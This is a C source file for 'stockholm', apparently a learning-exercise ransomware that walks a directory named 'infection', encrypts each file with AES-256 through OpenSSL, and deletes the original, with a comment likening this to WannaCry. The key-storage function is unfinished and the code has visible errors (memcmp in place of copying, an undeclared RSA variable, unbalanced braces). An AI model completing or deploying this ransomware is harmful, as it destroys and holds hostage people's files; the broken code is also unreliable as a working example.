#include <stdio.h>
#include <string.h>
#include <dirent.h>

#include <openssl/evp.h>
#include <openssl/rand.h>

#include "stockholm.h"

int stockholm_free( FILE *in, FILE *out, EVP_CIPHER_CTX *ctx, int exit_code ) {
	if ( in != NULL )
		fclose( in );
	if ( out != NULL )
		fclose( out );
	if ( ctx != NULL )
		EVP_CIPHER_CTX_free( ctx );

	return ( exit_code );
}

int stockholm_encrypt_and_store_key_iv( FILE *out, char key[], char iv[] ) {
	unsigned char aes_blob[48];

	memcmp( aes_blob, key, 32 );
	memcmp( aes_blob + 32, iv, 16 );

	// RSA *rsa = RSA_new();
	// if ( !rsa )
	// 	return ( 1 );

	unsigned char encrypted_blob[512];

	int encrypted_len = RSA_public_encrypt( 48, aes_blob, encrypted_blob, rsa, RSA_PKCS1_OAEP_PADDING );
	if ( encrypted_len == -1 )
		return ( 2 );

	if ( fwrite(encrypted_blob, 1, encrypted_len, out) != ( size_t ) encrypted_len )

}

int stockholm_encrypt( const char *filepath ) {
	printf( "The file that is going to be encrypted: %s\n", filepath );

	FILE *in = fopen( filepath, "rb" );
	if ( !in )
		return ( 1 );

	char outpath[4096];
	snprintf( outpath, sizeof(outpath), "%s.enc", filepath );

	FILE *out = fopen( outpath, "wb" );
	if (!out)
		return ( stockholm_free( in, NULL, NULL, 4 ) );

	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
	if ( !ctx )
		return ( stockholm_free( in, out, NULL, 3 ) );

	unsigned char key[32]; // 256 bits
	unsigned char iv[16];  // 128 bits (bloc AES)

	if ( RAND_bytes( key, sizeof(key) ) != 1 )
		return ( stockholm_free( in, out, ctx, 3 ) );

	if ( RAND_bytes( iv, sizeof(iv) ) != 1 )
		return ( stockholm_free( in, out, ctx, 3 ) );

	if ( !EVP_EncryptInit_ex( ctx, EVP_aes_256_cbc(), NULL, key, iv ) )
		return ( stockholm_free( in, out, ctx, 4 ) );

	unsigned char inbuf[1024], outbuf[1040];
	int inlen, outlen;

	while ( ( inlen = fread( inbuf, 1, sizeof(inbuf), in ) ) > 0 ) {
		if ( !EVP_EncryptUpdate( ctx, outbuf, &outlen, inbuf, inlen ) )
			return ( stockholm_free( in, out, ctx, 5 ) );

		if ( fwrite( outbuf, 1, outlen, out ) != ( size_t ) outlen )
			return ( stockholm_free( in, out, ctx, 6 ) );
	}

	if ( !EVP_EncryptFinal_ex( ctx, outbuf, &outlen ) )
		return ( stockholm_free( in, out, ctx, 7 ) );

	if ( fwrite( outbuf, 1, outlen, out ) != ( size_t ) outlen ) {
		return ( stockholm_free( in, out, ctx, 8 ) );

	EVP_CIPHER_CTX_free( ctx );
	fclose( in );
	fclose( out );

	snprintf( outpath, sizeof(outpath), "%s.key", filepath );
	FILE *out = fopen( outpath, "wb" );
	if (!out) {
		return ( 9 );
	}

	remove( filepath ); // Comme WannaCry : supprime le fichier original
	

	return ( 0 );
}

void stockholm( const char *dirname )
{
	DIR *dir = opendir( dirname ); // We only infect this directory
	if ( dir == NULL ) {
		return ;
	}

	struct dirent *entity;
	entity = readdir( dir );
	while ( entity ) {
		printf( "%hhd %s\n", entity->d_type, entity->d_name );
		// if ( entity->d_type == DT_DIR && strcmp( entity->d_name, "." ) != 0 &&strcmp( entity->d_name, ".." ) != 0 ) {
		// 	char path[4096] = { 0 }; // Max path name
		// 	strcat( path, dirname );
		// 	strcat( path, "/" );
		// 	strcat( path, entity->d_name );
		// 	stockholm( path );
		// }
		if ( entity->d_type == DT_REG ) {
			char filepath[4096] = { 0 }; // Max path name
			strcat( filepath, dirname );
			strcat( filepath, "/" );
			strcat( filepath, entity->d_name );
			stockholm_encrypt( filepath );
		}
		entity = readdir( dir );
	}

	closedir( dir );
}

int main( void )
{
	// char path[4096] = "/home/";
	// char *name;
	// strcat( path, "/ebonutto" );

	// strcat( path, $USER );
	// strcat( path, "/infection" );
	stockholm( "/home/ebonutto/infection" );
	return ( 0 );
}
